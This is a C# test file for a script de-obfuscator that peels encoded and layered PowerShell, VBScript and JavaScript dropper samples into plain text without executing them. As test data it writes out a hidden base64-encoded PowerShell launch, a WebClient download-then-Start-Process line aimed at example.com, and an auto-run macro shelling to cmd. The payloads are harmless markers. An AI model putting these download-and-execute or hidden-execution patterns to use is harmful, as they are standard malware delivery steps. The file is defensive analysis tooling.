using System.Text;
using Corvus.Services.Web.Scripts;

namespace Corvus.Tests;

/// <summary>Script readers: transformation layers peeled to plain text by a bounded evaluator, nothing executed.</summary>
public sealed class ScriptReaderTests
{
    internal static string Fixture(string language, string name) => Path.Combine(AppContext.BaseDirectory, "Web", "ScriptFixtures", language, name);

    public static TheoryData<string> PowerShellSamples() =>
        [.. Directory.GetFiles(Path.Combine(AppContext.BaseDirectory, "Web", "ScriptFixtures", "powershell"), "*.ps1").Select(f => Path.GetFileName(f)).Order()];

    [Theory]
    [MemberData(nameof(PowerShellSamples))]
    public void Invoke_obfuscation_output_reads_as_the_original_command(string name)
    {
        var r = ScriptReader.Read(File.ReadAllText(Fixture("powershell", name)), "powershell");
        Assert.Contains("Write-Host 'corvus marker'", r.Plain, StringComparison.OrdinalIgnoreCase);
        Assert.Contains("$u = 'http://example.com/corvus/stage.txt'", r.Plain, StringComparison.OrdinalIgnoreCase);
        Assert.True(r.Complete);
    }

    /// <summary>Fixtures modelled on public droppers: each hides "corvus marker" behind its layers.</summary>
    public static TheoryData<string, string> LayeredSamples()
    {
        var data = new TheoryData<string, string>();
        foreach (var language in new[] { "vbscript", "batch", "javascript" })
        {
            var dir = Path.Combine(AppContext.BaseDirectory, "Web", "ScriptFixtures", language);
            if (Directory.Exists(dir))
                foreach (var f in Directory.GetFiles(dir).Order()) data.Add(language, Path.GetFileName(f));
        }
        return data;
    }

    [Theory]
    [MemberData(nameof(LayeredSamples))]
    public void Layered_samples_read_as_plain_text(string language, string name)
    {
        var text = File.ReadAllText(Fixture(language, name));
        Assert.DoesNotContain("corvus marker", text, StringComparison.OrdinalIgnoreCase);
        var r = ScriptReader.Read(text, language);
        Assert.Contains("corvus marker", r.Plain, StringComparison.OrdinalIgnoreCase);
        Assert.True(r.Complete);
    }

    [Fact]
    public void A_vba_auto_run_macro_is_followed_into_its_shell_command()
    {
        var r = ScriptReader.Read(File.ReadAllText(Fixture("vbscript", "macro-autoopen.bas")), "vbscript");
        Assert.Contains(r.Calls, c => c.StartsWith("Shell \"cmd /c echo corvus marker", StringComparison.Ordinal));
        Assert.Contains("c = \"cmd /c echo corvus marker > %TEMP%\\c.txt\"", r.Plain);
    }

    [Fact]
    public void An_encoded_command_is_a_layer_with_its_decoding_chain()
    {
        var inner = Convert.ToBase64String(Encoding.Unicode.GetBytes("Write-Host 'stage two'"));
        var r = ScriptReader.Read($"powershell.exe -NoP -W Hidden -Enc {inner}", "powershell");
        var layer = Assert.Single(r.Layers);
        Assert.Equal("powershell -EncodedCommand of base64 > utf-16le", layer.Via);
        Assert.Equal("Write-Host 'stage two'", r.Plain.Trim());
    }

    [Fact]
    public void A_decoder_function_with_a_loop_is_evaluated()
    {
        const string script = """
            function D($s) { $r = ''; foreach ($c in $s.ToCharArray()) { $r += [char]([int]$c - 1) }; return $r }
            iex (D 'Xsjuf.Iptu!(ij(')
            """;
        var r = ScriptReader.Read(script, "powershell");
        Assert.Contains("Write-Host 'hi'", r.Plain);
        Assert.Single(r.Layers);
    }

    [Fact]
    public void Calls_are_listed_and_never_run()
    {
        var r = ScriptReader.Read("$w = New-Object Net.WebClient; $w.DownloadFile('http://example.com/a.exe', \"$env:TEMP\\a.exe\"); Start-Process a.exe", "powershell");
        Assert.Contains("New-Object Net.WebClient", r.Calls);
        Assert.Contains(r.Calls, c => c.StartsWith("Net.WebClient.DownloadFile('http://example.com/a.exe'", StringComparison.Ordinal));
        Assert.Contains("Start-Process", r.Calls);
    }

    [Fact]
    public void An_endless_loop_ends_at_the_budget()
    {
        var watch = System.Diagnostics.Stopwatch.StartNew();
        var r = ScriptReader.Read("$i = 0; while ($true) { $i++ }", "powershell", milliseconds: 500);
        Assert.False(r.Complete);
        Assert.True(watch.ElapsedMilliseconds < 5_000, $"{watch.ElapsedMilliseconds} ms");
    }

    [Fact]
    public void Damaged_scripts_read_without_failing()
    {
        var failures = new List<string>();
        foreach (var (language, name) in new[]
                 {
                     ("powershell", "string-reverse-1.ps1"), ("powershell", "encoding-bxor-1.ps1"), ("powershell", "compress-1.ps1"),
                     ("powershell", "token-all-1.ps1"), ("vbscript", "hex-function.vbs"), ("vbscript", "msxml-base64.vbs"),
                 })
            failures.AddRange(FormatFuzz.Run(File.ReadAllBytes(Fixture(language, name)), b =>
            {
                var r = ScriptReader.Read(Encoding.UTF8.GetString(b), language, milliseconds: 50);
                Assert.NotNull(r.Plain);
            }, 25));
        Assert.True(failures.Count == 0, string.Join("\n", failures.Take(10)));
    }
}
